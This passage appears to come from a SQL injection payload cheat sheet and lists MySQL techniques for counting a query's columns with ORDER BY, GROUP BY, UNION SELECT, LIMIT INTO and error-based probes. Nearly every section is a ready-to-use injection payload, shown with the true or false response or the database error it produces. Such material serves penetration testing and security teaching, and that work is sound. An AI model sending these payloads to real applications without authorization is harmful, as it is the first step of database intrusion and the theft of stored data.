##### USING ORDER BY OR GROUP BY
Keep incrementing the number until you get a False response. Even though GROUP BY and ORDER BY have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.

```
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns

#-1' UNION SELECT 1,2,3--+  True
```

Or

```
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns

1' UNION SELECT 1,2,3--+  True
```

##### USING ORDER BY OR GROUP BY ERROR BASED
Similar to the previous method, we can check the number of columns with 1 request if error showing is enabled.

```
1' ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+

Unknown column '4' in 'order clause'
```

This error means query uses 3 column

```
1' UNION SELECT 1,2,3--+  True
```

Or

```
1' GROUP BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+

Unknown column '4' in 'group statement'
```

This error means query uses 3 column

```
1' UNION SELECT 1,2,3--+  True
```

##### USING UNION SELECT ERROR BASED
This method works if error showing is enabled

```
1' UNION SELECT @--+        #The used SELECT statements have a different number of columns
1' UNION SELECT @,@--+      #The used SELECT statements have a different number of columns
1' UNION SELECT @,@,@--+    #No error means query uses 3 column

1' UNION SELECT 1,2,3--+  True
```

##### USING LIMIT INTO ERROR BASED
This method works if error showing is enabled. It is useful for finding the number of columns when the injection point is after a LIMIT clause.

```
1' LIMIT 1,1 INTO @--+        #The used SELECT statements have a different number of columns
1' LIMIT 1,1 INTO @,@--+      #The used SELECT statements have a different number of columns
1' LIMIT 1,1 INTO @,@,@--+    #No error means query uses 3 column

1' UNION SELECT 1,2,3--+    True
```

##### USING SELECT * FROM SOME_EXISTING_TABLE ERROR BASED
This works if you know the table name you're after and error showing is enabled. It will return the amount of columns in the table, not the query.

```
1' AND (SELECT * FROM Users) = 1--+     #Operand should contain 3 column(s)
                                        # This error means query uses 3 column

1' UNION SELECT 1,2,3--+  True
```
